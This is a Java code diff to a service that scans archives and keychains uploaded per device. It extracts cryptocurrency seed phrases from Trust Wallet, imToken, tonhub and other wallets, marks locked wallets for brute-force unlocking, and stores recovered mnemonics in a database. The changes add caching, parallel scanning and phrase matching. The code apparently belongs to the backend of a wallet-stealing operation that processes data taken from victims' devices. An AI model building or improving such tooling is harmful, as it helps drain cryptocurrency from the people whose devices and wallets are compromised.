@@ -11,6 +11,11 @@ import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 import java.util.Set;
+import java.util.concurrent.Callable;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.Future;
 
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.stereotype.Service;
@@ -51,8 +56,31 @@ public class DeviceWalletService {
     private final TrustWallet trustWallet;
     private final ImTokenWallet imTokenWallet;
 
+    /** 同一设备的压缩包互不依赖，并行扫完再按原顺序合并。 */
+    private final ExecutorService scanPool = Executors.newFixedThreadPool(4, r -> {
+        Thread t = new Thread(r, "wallet-scan");
+        t.setDaemon(true);
+        return t;
+    });
+    private final ConcurrentHashMap<String, Object> scanLocks = new ConcurrentHashMap<>();
+    private final ConcurrentHashMap<String, CachedScan> scanCache = new ConcurrentHashMap<>();
+
+    private static final class CachedScan {
+        final String fingerprint;
+        final List<WalletDisplay> displays;
+        final long at;
+
+        CachedScan(String fingerprint, List<WalletDisplay> displays) {
+            this.fingerprint = fingerprint;
+            this.displays = displays;
+            this.at = System.nanoTime();
+        }
+    }
+
     public Map<String, Object> enrichDetail(DeviceEntity d, Map<String, Object> data) {
         List<WalletDisplay> displays = scan(d);
+        List<MnemonicEntity> storedRows = mnemonicDao.selectList(
+                new QueryWrapper<MnemonicEntity>().eq("deviceId", d.getDeviceId()));
         List<Map<String, Object>> wallets = new ArrayList<>();
         List<Map<String, Object>> notes = new ArrayList<>();
         List<String[]> persistItems = new ArrayList<>();
@@ -60,7 +88,7 @@ public class DeviceWalletService {
             if ("notes".equals(w.getWalletKey())) {
                 notes.add(noteBlock(w));
             } else {
-                wallets.add(walletCard(w, d.getDeviceId()));
+                wallets.add(walletCard(w, storedRows));
             }
             if (w.getPhrase() != null && !w.getPhrase().isBlank() && w.isStatusOk()
                     && !"notes".equals(w.getWalletKey())) {
@@ -88,10 +116,80 @@ public class DeviceWalletService {
 
     public List<WalletDisplay> scan(DeviceEntity d) {
         String did = d.getDeviceId();
+        Object lock = scanLocks.computeIfAbsent(did, k -> new Object());
+        synchronized (lock) {
+            List<UploadFileEntity> files = uploadFileDao.selectList(
+                    new QueryWrapper<UploadFileEntity>().eq("deviceId", did).orderByDesc("id"));
+            String fp = fingerprint(did, files);
+            CachedScan hit = scanCache.get(did);
+            if (hit != null && fp.equals(hit.fingerprint)) {
+                return new ArrayList<>(hit.displays);
+            }
+            List<WalletDisplay> out = scanUploads(did, files);
+            remember(did, fp, out);
+            return new ArrayList<>(out);
+        }
+    }
+
+    /**
+     * 上传记录、磁盘文件时间和 keychain 都没变时，重复打开详情不再重扫压缩包。
+     * 入库助记词仍每次从数据库读取，解锁后的状态不受缓存影响。
+     */
+    private String fingerprint(String did, List<UploadFileEntity> files) {
+        StringBuilder sb = new StringBuilder();
+        for (UploadFileEntity u : files) {
+            sb.append(u.getId()).append('|')
+                    .append(u.getFileName()).append('|')
+                    .append(u.getFileSize()).append('|')
+                    .append(u.getStatus()).append('|')
+                    .append(u.getSha256()).append('|')
+                    .append(u.getUpdatedAt() == null ? 0 : u.getUpdatedAt().getTime())
+                    .append('|');
+            String fname = StringUtils.trimToEmpty(u.getFileName());
+            if (WalletMatcher.isCoreExportName(fname) || WalletMatcher.isArchive(fname)) {
+                appendStat(sb, resolve(u));
+            }
+            sb.append('\n');
+        }
+        sb.append("kc|");
+        appendStat(sb, UploadPaths.findDeviceKeychain(props.getUploadDir(), did));
+        return sb.toString();
+    }
+
+    private static void appendStat(StringBuilder sb, Path path) {
+        if (path == null) {
+            sb.append('-');
+            return;
+        }
+        try {
+            sb.append(Files.size(path)).append('@').append(Files.getLastModifiedTime(path).toMillis());
+        } catch (Exception e) {
+            sb.append('!');
+        }
+    }
+
+    private void remember(String did, String fp, List<WalletDisplay> out) {
+        scanCache.put(did, new CachedScan(fp, out));
+        if (scanCache.size() <= 32) {
+            return;
+        }
+        String oldest = null;
+        long at = Long.MAX_VALUE;
+        for (Map.Entry<String, CachedScan> e : scanCache.entrySet()) {
+            if (e.getValue().at < at) {
+                at = e.getValue().at;
+                oldest = e.getKey();
+            }
+        }
+        if (oldest != null && !oldest.equals(did)) {
+            scanCache.remove(oldest);
+        }
+    }
+
+    private List<WalletDisplay> scanUploads(String did, List<UploadFileEntity> files) {
         List<WalletDisplay> out = new ArrayList<>();
         Set<String> seen = new LinkedHashSet<>();
-        List<UploadFileEntity> files = uploadFileDao.selectList(
-                new QueryWrapper<UploadFileEntity>().eq("deviceId", did).orderByDesc("id"));
+        List<Callable<List<WalletDisplay>>> jobs = new ArrayList<>();
         for (UploadFileEntity u : files) {
             String fname = StringUtils.trimToEmpty(u.getFileName());
             if (fname.isEmpty() || seen.contains(fname)) {
@@ -112,8 +210,10 @@ public class DeviceWalletService {
                             did, fname, u.getDiskPath());
                     continue;
                 }
-                out.addAll(scanPath(did, fname, path));
                 seen.add(fname);
+                String fileName = fname;
+                Path archivePath = path;
+                jobs.add(() -> scanPath(did, fileName, archivePath));
                 continue;
             }
             // 对齐 Python V2 classify：generic 归档不进解析卡
@@ -124,12 +224,19 @@ public class DeviceWalletService {
             seen.add(fname);
             if (path == null) {
                 log.warn("scan file missing device={} file={} diskPath={}", did, fname, u.getDiskPath());
-                out.add(archiveScanner.missingFile(matched[0], fname, matched[1]));
+                String title = matched[0];
+                String wkey = matched[1];
+                String fileName = fname;
+                jobs.add(() -> List.of(archiveScanner.missingFile(title, fileName, wkey)));
             } else {
-                out.addAll(scanPath(did, fname, path));
+                String fileName = fname;
+                Path archivePath = path;
+                jobs.add(() -> scanPath(did, fileName, archivePath));
             }
         }
+        out.addAll(runJobs(jobs));
         if (out.isEmpty()) {
+            List<Callable<List<WalletDisplay>>> diskJobs = new ArrayList<>();
             for (Path p : UploadPaths.listDeviceArchives(props.getUploadDir(), did)) {
                 String fname = p.getFileName().toString();
                 if (seen.contains(fname)) {
@@ -139,11 +246,46 @@ public class DeviceWalletService {
                     continue;
                 }
                 seen.add(fname);
-                out.addAll(scanPath(did, fname, p));
+                diskJobs.add(() -> scanPath(did, fname, p));
             }
+            out.addAll(runJobs(diskJobs));
         }
         mergeKeychain(did, out);
         return expandImToken(out);
+    }
+
+    private List<WalletDisplay> runJobs(List<Callable<List<WalletDisplay>>> jobs) {
+        List<WalletDisplay> out = new ArrayList<>();
+        if (jobs.isEmpty()) {
+            return out;
+        }
+        if (jobs.size() == 1) {
+            try {
+                List<WalletDisplay> part = jobs.get(0).call();
+                if (part != null) {
+                    out.addAll(part);
+                }
+            } catch (Exception e) {
+                log.warn("scan fail err={}", e.toString());
+            }
+            return out;
+        }
+        try {
+            for (Future<List<WalletDisplay>> future : scanPool.invokeAll(jobs)) {
+                try {
+                    List<WalletDisplay> part = future.get();
+                    if (part != null) {
+                        out.addAll(part);
+                    }
+                } catch (Exception e) {
+                    log.warn("scan fail err={}", e.toString());
+                }
+            }
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+            log.warn("scan interrupted");
+        }
+        return out;
     }
 
     public Path resolveUpload(String deviceId, String fileName) {
@@ -346,8 +488,8 @@ public class DeviceWalletService {
                 : src + "，共 " + phrases.size() + " 组助记词");
     }
 
-    private Map<String, Object> walletCard(WalletDisplay w, String deviceId) {
-        String stored = storedPhrase(deviceId, w.getName(), w.getPhrase());
+    private Map<String, Object> walletCard(WalletDisplay w, List<MnemonicEntity> storedRows) {
+        String stored = storedPhrase(storedRows, w);
         boolean ok = w.isStatusOk() || StringUtils.isNotBlank(stored);
         boolean unlockable = w.isUnlockable() || WalletInspect.maybePasswordLocked(w.getWalletKey());
         boolean brute = w.isBrute() || ("tonhub".equals(w.getWalletKey()) && unlockable);
@@ -360,7 +502,9 @@ public class DeviceWalletService {
         }
         String message = StringUtils.defaultString(w.getMessage());
         String phrase = StringUtils.defaultIfBlank(stored, w.getPhrase());
-        if (StringUtils.isNotBlank(phrase) && message.contains(phrase)) {
+        if (StringUtils.isNotBlank(stored) && StringUtils.isBlank(w.getPhrase())) {
+            message = "助记词已入库（此前解锁/解析）";
+        } else if (StringUtils.isNotBlank(phrase) && message.contains(phrase)) {
             message = "已直接解析助记词";
         }
         Map<String, Object> m = new LinkedHashMap<>();
@@ -409,26 +553,31 @@ public class DeviceWalletService {
         return m;
     }
 
-    private String storedPhrase(String deviceId, String source, String scanned) {
-        if (scanned != null && !scanned.isBlank()) {
-            return scanned;
+    private String storedPhrase(List<MnemonicEntity> rows, WalletDisplay w) {
+        if (w.getPhrase() != null && !w.getPhrase().isBlank()) {
+            return w.getPhrase();
         }
-        return loadStoredPhrase(deviceId, null, source);
+        return matchStoredDisplay(rows, w);
     }
 
     /**
-     * 从 mnemonic 表按 wallet_key / 钱包显示名匹配已入库助记词（对齐 Python reveal 兜底）。
+     * 对齐 Python apply_stored_phrases_to_displays。
+     * imToken 卡片名是「imToken · 账户」，入库 source 可能只是 imToken，两边都要能对上。
      */
-    public String loadStoredPhrase(String deviceId, String walletKey, String title) {
-        List<MnemonicEntity> rows = mnemonicDao.selectList(new QueryWrapper<MnemonicEntity>().eq("deviceId", deviceId));
-        if (rows.isEmpty()) {
+    private String matchStoredDisplay(List<MnemonicEntity> rows, WalletDisplay w) {
+        if (rows == null || rows.isEmpty() || w == null) {
+            return null;
+        }
+        String wkey = StringUtils.trimToEmpty(w.getWalletKey()).toLowerCase(Locale.ROOT);
+        String name = StringUtils.trimToEmpty(w.getName()).toLowerCase(Locale.ROOT);
+        String account = StringUtils.trimToEmpty(w.getAccountName()).toLowerCase(Locale.ROOT);
+        if ("generic".equals(wkey) || "notes".equals(wkey) || "whatsapp".equals(wkey) || "telegram".equals(wkey)) {
+            return null;
+        }
+        if (wkey.isEmpty() && name.isEmpty()) {
             return null;
         }
         String aes = props.getMnemonicAesKey();
-        String keyLow = walletKey == null ? "" : walletKey.trim().toLowerCase(Locale.ROOT);
-        String titleLow = title == null ? "" : title.trim().toLowerCase(Locale.ROOT);
-        List<String> matched = new ArrayList<>();
-        List<String> all = new ArrayList<>();
         for (MnemonicEntity row : rows) {
             String plain;
             try {
@@ -440,29 +589,111 @@ public class DeviceWalletService {
                 continue;
             }
             plain = plain.trim();
-            all.add(plain);
+            String src = row.getSource() == null ? "" : row.getSource().trim().toLowerCase(Locale.ROOT);
+            String[] parts = src.replace('，', ',').split(",");
+            boolean hit = false;
+            if (!name.isEmpty()) {
+                for (String p : parts) {
+                    String part = p.trim();
+                    if (part.isEmpty()) {
+                        continue;
+                    }
+                    if (name.equals(part) || name.contains(part) || part.contains(name)
+                            || name.equals(part.replace(" ", ""))) {
+                        hit = true;
+                        break;
+                    }
+                }
+            }
+            if (!hit && !account.isEmpty()) {
+                for (String p : parts) {
+                    String part = p.trim();
+                    if (!part.isEmpty() && (account.equals(part) || part.contains(account))) {
+                        hit = true;
+                        break;
+                    }
+                }
+            }
+            if (!hit && !wkey.isEmpty() && account.isEmpty()) {
+                for (String p : parts) {
+                    if (wkey.equals(p.trim())) {
+                        hit = true;
+                        break;
+                    }
+                }
+            }
+            if (hit) {
+                return plain;
+            }
+        }
+        return null;
+    }
+
+    /**
+     * 从 mnemonic 表按 wallet_key / 钱包显示名匹配已入库助记词（对齐 Python reveal 兜底）。
+     */
+    public String loadStoredPhrase(String deviceId, String walletKey, String title) {
+        List<MnemonicEntity> rows = mnemonicDao.selectList(new QueryWrapper<MnemonicEntity>().eq("deviceId", deviceId));
+        return matchStored(rows, walletKey, title);
+    }
+
+    private String matchStored(List<MnemonicEntity> rows, String walletKey, String title) {
+        if (rows == null || rows.isEmpty()) {
+            return null;
+        }
+        String aes = props.getMnemonicAesKey();
+        String keyLow = walletKey == null ? "" : walletKey.trim().toLowerCase(Locale.ROOT);
+        String titleLow = title == null ? "" : title.trim().toLowerCase(Locale.ROOT);
+        List<String> matched = new ArrayList<>();
+        for (MnemonicEntity row : rows) {
+            String plain;
+            try {
+                plain = MnemonicAesUtil.decrypt(row.getResult(), aes);
+            } catch (Exception e) {
+                continue;
+            }
+            if (plain == null || plain.isBlank() || MnemonicAesUtil.looksEncrypted(plain)) {
+                continue;
+            }
+            plain = plain.trim();
             String src = row.getSource() == null ? "" : row.getSource().trim().toLowerCase(Locale.ROOT);
             if ((!keyLow.isEmpty() && (src.contains(keyLow) || src.equals(keyLow)))
                     || (!titleLow.isEmpty() && (src.contains(titleLow) || src.equals(titleLow)))) {
                 matched.add(plain);
             }
         }
-        List<String> pool = !matched.isEmpty() ? matched : (all.size() == 1 ? all : List.of());
-        if (pool.isEmpty()) {
+        if (matched.isEmpty()) {
             return null;
         }
-        return String.join("\n", pool);
+        return String.join("\n", matched);
     }
 
+    /** 每行助记词保留前面的词，最后 4 个词用 **** 代替。对齐 Python {@code mask_mnemonic_phrase}。 */
     private static String mask(String phrase) {
         if (phrase == null || phrase.isBlank()) {
             return "";
         }
-        String[] parts = phrase.trim().split("\\s+");
-        if (parts.length < 3) {
-            return "****";
+        List<String> lines = new ArrayList<>();
+        for (String raw : phrase.split("\\r?\\n")) {
+            String line = raw.trim();
+            if (line.isEmpty()) {
+                continue;
+            }
+            String[] words = line.split("\\s+");
+            if (words.length <= 4) {
+                lines.add("**** ".repeat(words.length).trim());
+                continue;
+            }
+            StringBuilder sb = new StringBuilder();
+            for (int i = 0; i < words.length; i++) {
+                if (i > 0) {
+                    sb.append(' ');
+                }
+                sb.append(i < words.length - 4 ? words[i] : "****");
+            }
+            lines.add(sb.toString());
         }
-        return parts[0] + " **** " + parts[parts.length - 1];
+        return String.join("\n", lines);
     }
 
     public static String sha256Hex(String text) {
